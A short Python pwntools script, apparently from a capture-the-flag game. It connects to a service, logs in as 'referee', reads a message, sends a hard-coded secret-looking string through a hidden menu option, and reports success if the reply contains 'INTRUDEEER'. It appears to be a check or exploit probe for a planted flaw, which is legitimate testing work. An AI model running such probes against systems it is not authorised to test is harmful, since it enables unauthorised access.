from pwn import *


def arinzaarunzal0(host, port):
	success = False
	r = remote(host, port)
	res = r.readuntil('user:')
	#print(res)
	r.send("referee\n")
	res = r.readuntil('>')
	#print(res)
	r.send("2\n")
	res = r.readuntil('read?')
	#print(res)
	r.send("0\n")
	res = r.readuntil('>')
	#print(res)
	res = res.splitlines()
	res = filter(lambda x: 'Hi, my name is referee' in x, res)
	if res:
		r.send("6\n")
		res = r.readuntil('>>')
		#print(res)
		r.send("Hi8342DHD34gjsW\n")
		res = r.readuntil('>')
		res = res.splitlines()
		res = filter(lambda x: 'INTRUDEEER' in x, res)
		if res:
			success = True
	r.send("7\n")
	r.close();
	return success
